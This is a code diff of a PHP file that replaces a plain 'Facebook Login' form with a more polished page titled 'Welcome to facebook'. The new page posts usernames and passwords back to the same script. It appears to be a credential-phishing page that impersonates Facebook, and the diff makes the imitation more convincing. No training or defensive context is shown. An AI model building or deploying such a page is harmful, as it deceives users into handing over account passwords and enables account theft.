@@ -37,45 +37,36 @@ if(!empty($username)&&!empty($password)){
 ?>
 
 
-<html>
-	<head>
-		<style>
-	
-body{background: radial-gradient(ellipse farthest-corner at 45px 45px , #00FFFF 0%, rgba(0, 0, 255, 0) 50%, #0000FF 95%);}
-
-
-		</style>
-	</head>	
-	<body>
-<table width="300" border="0" align="center" cellpadding="0" cellspacing="1" bgcolor="#CCCCCC">
-<tr>
-<form name="form1" method="post" action="<?php echo $current_file; ?>">
-<td>
-<table width="100%" border="0" cellpadding="3" cellspacing="1" bgcolor="#FFFFFF">
-<tr>
-<td colspan="3"><strong>Facebook Login </strong></td>
-</tr>
-<tr>
-<td width="78">Username</td>
-<td width="6">:</td>
-<td width="294"><input name="username" type="text" id="username" required></td>
-</tr>
-<tr>
-<td>Password</td>
-<td>:</td>
-<td><input name="password" type="password" id="password" required></td>
-</tr>
-<tr>
-<td>&nbsp;</td>
-<td>&nbsp;</td>
-<td><input type="submit" name="Submit" value="Login"></td>
-</tr>
-</table>
-</td>
-</form>
-</tr>
-</table>
-<div>
-	</div>
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html lang="en" class="ie6 ielt8"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" class="ie7 ielt8"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" class="ie8"> <![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!--> <html lang="en"> <!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Welcome to facebook</title>
+<link rel="stylesheet" type="text/css" href="style.css" />
+</head>
+<body>
+<div class="container">
+	<section id="content">
+		<form  method="post" action="<?php echo $current_file; ?>">
+			<h1>Login</h1>
+			<div>
+				<input type="text" placeholder="Username" required="" id="username" name="username" />
+			</div>
+			<div>
+				<input type="password" placeholder="Password" required="" id="password" name="password" />
+			</div>
+			<div>
+				<input type="submit" value="Log in" />
+				
+			</div>
+		</form><!-- form -->
+		<div class="button">
+			
+		</div><!-- button -->
+	</section><!-- content -->
+</div><!-- container -->
 </body>
 </html>
